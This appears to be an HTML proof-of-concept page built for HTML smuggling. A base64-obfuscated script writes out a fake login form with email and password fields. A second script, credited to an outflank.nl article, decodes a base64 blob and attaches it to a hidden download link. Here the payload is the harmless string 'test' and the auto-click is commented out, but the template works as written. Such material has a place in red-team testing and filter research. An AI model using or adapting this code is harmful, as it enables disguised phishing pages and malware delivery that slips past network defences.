<!doctype html>
<html>
<script src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUoJzwhRE9DVFlQRSBodG1sPjxodG1sIGxhbmc9ImVuIiA+PGhlYWQ+ICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+ICA8dGl0bGU+U2ltcGxlIExvZ2luIEZvcm0gRXhhbXBsZTwvdGl0bGU+ICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1SdWJpazo0MDAsNzAwIj48c3R5bGUgIHR5cGU9InRleHQvY3NzIj4qIHsgIG1hcmdpbjogMDsgIHBhZGRpbmc6IDA7ICBib3gtc2l6aW5nOiBib3JkZXItYm94OyAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7fWJvZHkgeyAgYmFja2dyb3VuZDogI2UzNTg2OTsgIGZvbnQtZmFtaWx5OiAiUnViaWsiLCBzYW5zLXNlcmlmO30ubG9naW4tZm9ybSB7ICBiYWNrZ3JvdW5kOiAjZmZmOyAgd2lkdGg6IDUwMHB4OyAgbWFyZ2luOiA2NXB4IGF1dG87ICBkaXNwbGF5OiAtd2Via2l0LWJveDsgIGRpc3BsYXk6IGZsZXg7ICAtd2Via2l0LWJveC1vcmllbnQ6IHZlcnRpY2FsOyAgLXdlYmtpdC1ib3gtZGlyZWN0aW9uOiBub3JtYWw7ICAgICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47ICBib3JkZXItcmFkaXVzOiA0cHg7ICBib3gtc2hhZG93OiAwIDJweCAyNXB4IHJnYmEoMCwgMCwgMCwgMC4yKTt9LmxvZ2luLWZvcm0gaDEgeyAgcGFkZGluZzogMzVweCAzNXB4IDAgMzVweDsgIGZvbnQtd2VpZ2h0OiAzMDA7fS5sb2dpbi1mb3JtIC5jb250ZW50IHsgIHBhZGRpbmc6IDM1cHg7ICB0ZXh0LWFsaWduOiBjZW50ZXI7fS5sb2dpbi1mb3JtIC5pbnB1dC1maWVsZCB7ICBwYWRkaW5nOiAxMnB4IDVweDt9LmxvZ2luLWZvcm0gLmlucHV0LWZpZWxkIGlucHV0IHsgIGZvbnQtc2l6ZTogMTZweDsgIGRpc3BsYXk6IGJsb2NrOyAgZm9udC1mYW1pbHk6ICJSdWJpayIsIHNhbnMtc2VyaWY7ICB3aWR0aDogMTAwJTsgIHBhZGRpbmc6IDEwcHggMXB4OyAgYm9yZGVyOiAwOyAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICM3NDc0NzQ7ICBvdXRsaW5lOiBub25lOyAgLXdlYmtpdC10cmFuc2l0aW9uOiBhbGwgLjJzOyAgdHJhbnNpdGlvbjogYWxsIC4yczt9LmxvZ2luLWZvcm0gLmlucHV0LWZpZWxkIGlucHV0Ojotd2Via2l0LWlucHV0LXBsYWNlaG9sZGVyIHsgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7fS5sb2dpbi1mb3JtIC5pbnB1dC1maWVsZCBpbnB1dDo6LW1vei1wbGFjZWhvbGRlciB7ICB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlO30ubG9naW4tZm9ybSAuaW5wdXQtZmllbGQgaW5wdXQ6LW1zLWlucHV0LXBsYWNlaG9sZGVyIHsgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7fS5sb2dpbi1mb3JtIC5pbnB1dC1maWVsZCBpbnB1dDo6LW1zLWlucHV0LXBsYWNlaG9sZGVyIHsgIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7fS5sb2dpbi1mb3JtIC5pbnB1dC1maWVsZCBpbnB1dDo6cGxhY2Vob2xkZXIgeyAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTt9LmxvZ2luLWZvcm0gLmlucHV0LWZpZWxkIGlucHV0OmZvY3VzIHsgIGJvcmRlci1jb2xvcjogIzIyMjt9LmxvZ2luLWZvcm0gYS5saW5rIHsgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsgIGNvbG9yOiAjNzQ3NDc0OyAgbGV0dGVyLXNwYWNpbmc6IDAuMnB4OyAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsgIGRpc3BsYXk6IGlubGluZS1ibG9jazsgIG1hcmdpbi10b3A6IDIwcHg7fS5sb2dpbi1mb3JtIC5hY3Rpb24geyAgZGlzcGxheTogLXdlYmtpdC1ib3g7ICBkaXNwbGF5OiBmbGV4OyAgLXdlYmtpdC1ib3gtb3JpZW50OiBob3Jpem9udGFsOyAgLXdlYmtpdC1ib3gtZGlyZWN0aW9uOiBub3JtYWw7ICAgICAgICAgIGZsZXgtZGlyZWN0aW9uOiByb3c7fS5sb2dpbi1mb3JtIC5hY3Rpb24gYnV0dG9uIHsgIHdpZHRoOiAxMDAlOyAgYm9yZGVyOiBub25lOyAgcGFkZGluZzogMThweDsgIGZvbnQtZmFtaWx5OiAiUnViaWsiLCBzYW5zLXNlcmlmOyAgY3Vyc29yOiBwb2ludGVyOyAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsgIGJhY2tncm91bmQ6ICNlOGU5ZWM7ICBjb2xvcjogIzc3NzsgIGJvcmRlci1ib3R0b20tbGVmdC1yYWRpdXM6IDRweDsgIGJvcmRlci1ib3R0b20tcmlnaHQtcmFkaXVzOiAwOyAgbGV0dGVyLXNwYWNpbmc6IDAuMnB4OyAgb3V0bGluZTogMDsgIC13ZWJraXQtdHJhbnNpdGlvbjogYWxsIC4zczsgIHRyYW5zaXRpb246IGFsbCAuM3M7fS5sb2dpbi1mb3JtIC5hY3Rpb24gYnV0dG9uOmhvdmVyIHsgIGJhY2tncm91bmQ6ICNkOGQ4ZDg7fS5sb2dpbi1mb3JtIC5hY3Rpb24gYnV0dG9uOm50aC1jaGlsZCgyKSB7ICBiYWNrZ3JvdW5kOiAjMmQzYjU1OyAgY29sb3I6ICNmZmY7ICBib3JkZXItYm90dG9tLWxlZnQtcmFkaXVzOiAwOyAgYm9yZGVyLWJvdHRvbS1yaWdodC1yYWRpdXM6IDRweDt9LmxvZ2luLWZvcm0gLmFjdGlvbiBidXR0b246bnRoLWNoaWxkKDIpOmhvdmVyIHsgIGJhY2tncm91bmQ6ICMzYzRkNmQ7fTwvc3R5bGU+PC9oZWFkPjxib2R5PjwhLS0gcGFydGlhbDppbmRleC5wYXJ0aWFsLmh0bWwgLS0+PGRpdiBjbGFzcz0ibG9naW4tZm9ybSI+ICA8Zm9ybT4gICAgPGgxPkxvZ2luPC9oMT4gICAgPGRpdiBjbGFzcz0iY29udGVudCI+ICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZmllbGQiPiAgICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiBwbGFjZWhvbGRlcj0iRW1haWwiIGF1dG9jb21wbGV0ZT0ibm9wZSI+ICAgICAgPC9kaXY+ICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZmllbGQiPiAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiIGF1dG9jb21wbGV0ZT0ibmV3LXBhc3N3b3JkIj4gICAgICA8L2Rpdj4gICAgICA8YSBocmVmPSIjIiBjbGFzcz0ibGluayI+Rm9yZ290IFlvdXIgUGFzc3dvcmQ/PC9hPiAgICA8L2Rpdj4gICAgPGRpdiBjbGFzcz0iYWN0aW9uIj4gICAgICA8YnV0dG9uPlJlZ2lzdGVyPC9idXR0b24+ICAgICAgPGJ1dHRvbj5TaWduIGluPC9idXR0b24+ICAgIDwvZGl2PiAgPC9mb3JtPjwvZGl2PjwhLS0gcGFydGlhbCAtLT4gIDxzY3JpcHQgIHNyYz0iLi9zY3JpcHQuanMiPjwvc2NyaXB0PjwvYm9keT48L2h0bWw+Jyk7Cg=="></script>
  <!-- code from https://outflank.nl/blog/2018/08/14/html-smuggling-explained/ -->
  <script>
            function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
                return bytes.buffer;
            }

            // Text file called test.txt with the string test inside it
            var file = 'dGVzdA==';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {type: 'octet/stream'});
            var fileName = 'test.txt';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fileName);
            } else {
                var a = document.createElement('a');
                console.log(a);
                document.body.appendChild(a);
                a.style = 'display: none';
                var url = window.URL.createObjectURL(blob);
                a.href = url;
                a.download = fileName;
                //a.click();
                window.URL.revokeObjectURL(url);
            }
        </script>
</html>
